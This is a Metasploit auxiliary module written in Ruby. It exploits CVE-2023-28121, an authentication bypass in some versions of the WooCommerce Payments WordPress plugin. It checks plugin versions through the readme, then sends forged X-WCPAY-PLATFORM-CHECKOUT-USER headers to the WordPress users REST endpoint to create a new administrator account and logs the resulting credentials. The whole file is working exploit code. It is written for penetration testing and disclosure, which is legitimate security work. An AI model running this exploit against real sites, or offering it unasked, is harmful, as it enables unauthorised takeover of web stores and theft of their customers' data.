##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation',
        'Description' => %q{
          WooCommerce-Payments plugin for Wordpress versions 4.8', '4.8.2, 4.9', '4.9.1,
          5.0', '5.0.4, 5.1', '5.1.3, 5.2', '5.2.2, 5.3', '5.3.1, 5.4', '5.4.1,
          5.5', '5.5.2, and 5.6', '5.6.2 contain an authentication bypass by specifying a valid user ID number
          within the X-WCPAY-PLATFORM-CHECKOUT-USER header. With this authentication bypass, a user can then use the API
          to create a new user with administrative privileges on the target WordPress site IF the user ID
          selected corresponds to an administrator account.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Michael Mazzolini', # original discovery
          'Julien Ahrens' # detailed writeup
        ],
        'References' => [
          ['URL', 'https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/'],
          ['URL', 'https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/'],
          ['CVE', '2023-28121']
        ],
        'DisclosureDate' => '2023-03-22',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [true, 'User to create', '']),
        OptString.new('PASSWORD', [false, 'Password to create, random if blank', '']),
        OptString.new('EMAIL', [false, 'Email to create, random if blank', '']),
        OptInt.new('ADMINID', [false, 'ID Number of a WordPress administrative user', 1]),
        OptString.new('TARGETURI', [true, 'The URI of the Wordpress instance', '/'])
      ]
    )
  end

  def check
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    vuln_versions = [
      ['4.8', '4.8.2'],
      ['4.9', '4.9.1'],
      ['5.0', '5.0.4'],
      ['5.1', '5.1.3'],
      ['5.2', '5.2.2'],
      ['5.3', '5.3.1'],
      ['5.4', '5.4.1'],
      ['5.5', '5.5.2'],
      ['5.6', '5.6.2']
    ]

    vuln_versions.each do |versions|
      introduced = versions[0]
      fixed = versions[1]
      checkcode = check_plugin_version_from_readme('woocommerce-payments', fixed, introduced)
      if checkcode == Exploit::CheckCode::Appears
        return Msf::Exploit::CheckCode::Appears('WooCommerce-Payments version is exploitable')
      end
    end

    Msf::Exploit::CheckCode::Safe('WooCommerce-Payments version not vulnerable or plugin not installed')
  end

  def run
    password = datastore['PASSWORD']
    if datastore['PASSWORD'].blank?
      password = Rex::Text.rand_text_alphanumeric(10..15)
    end

    email = datastore['EMAIL']
    if datastore['EMAIL'].blank?
      email = Rex::Text.rand_mail_address
    end

    username = datastore['USERNAME']
    if datastore['USERNAME'].blank?
      username = Rex::Text.rand_text_alphanumeric(5..20)
    end

    print_status("Attempting to create an administrator user -> #{username}:#{password} (#{email})")
    ['/', 'index.php', '/rest'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
      if url_root == '/rest'
        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path),
          'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
          'method' => 'POST',
          'ctype' => 'application/json',
          'vars_get' => { 'rest_route' => 'wp-json/wp/v2/users' },
          'data' => {
            'username' => username,
            'email' => email,
            'password' => password,
            'roles' => ['administrator']
          }.to_json
        })
      else
        res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),
          'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
          'method' => 'POST',
          'ctype' => 'application/json',
          'data' => {
            'username' => username,
            'email' => email,
            'password' => password,
            'roles' => ['administrator']
          }.to_json
        })
      end
      fail_with(Failure::Unreachable, 'Connection failed') unless res
      next if res.code == 404

      if res.code == 201 && res.body&.match(/"email":"#{email}"/) && res.body&.match(/"username":"#{username}"/)
        print_good('User was created successfully')
        if framework.db.active
          create_credential_and_login({
            address: rhost,
            port: rport,
            protocol: 'tcp',
            workspace_id: myworkspace_id,
            origin_type: :service,
            service_name: 'WordPress',
            username: username,
            private_type: :password,
            private_data: password,
            module_fullname: fullname,
            access_level: 'administrator',
            last_attempted_at: DateTime.now,
            status: Metasploit::Model::Login::Status::SUCCESSFUL
          })
        end
      else
        print_error("Server response: #{res.body}")
      end
      break # we didn't get a 404 so we can bail on the 2nd attempt
    end
  end
end
